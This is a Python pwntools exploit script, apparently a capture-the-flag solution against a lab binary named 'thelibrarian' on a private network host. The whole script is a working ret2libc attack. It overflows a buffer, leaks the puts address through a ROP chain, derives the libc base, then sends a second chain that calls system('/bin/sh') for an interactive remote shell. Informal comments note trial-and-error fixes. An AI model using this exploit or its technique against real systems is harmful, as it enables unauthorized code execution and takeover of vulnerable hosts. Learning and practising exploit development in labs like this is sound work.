# Ret2libc always has ASLR enabled

from pwn import *

elf = context.binary = ELF('./thelibrarian', checksec=False)
libc = ELF('libc.so.6')
context.log_level = 'debug'

io = remote('10.10.39.153', 9008)

offset = 264
ret = p64(0x4004c6)
pop_rdi = p64(0x400639)


### Leak puts address using puts itself
plt_puts = p64(elf.plt['puts'])
got_puts = p64(elf.got['puts'])


payload = b'A' * offset
payload += ret
payload += pop_rdi + got_puts + plt_puts
payload += p64(elf.sym['main'])

io.sendlineafter('Again? Where this time? : \n', payload)




# Align the received inputs (Trial and error)
io.recvline()
io.recvline()
io.recvline()

puts_leak = unpack(io.recv(6).ljust(8,b'\x00'))

log.success(f'puts leak: {hex(puts_leak)}')




### Calculate Libc Address using libc object (libc.sym[] not elf.sym[])

libc.address = puts_leak - libc.sym['puts']
log.success(f'Libc Address: {hex(libc.address)}')





### ROP Chain for getting a shell (manual doesnt work i still dk why)


rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))
payload2 = b'A' * offset + ret + ret + rop.chain()		# Adding extra ret fixed the issue lmao (tak letak ret pun no hal)

io.sendlineafter('Again? Where this time? : ', payload2)

io.recvuntil(b"\nok, let's go!\n")
io.interactive()


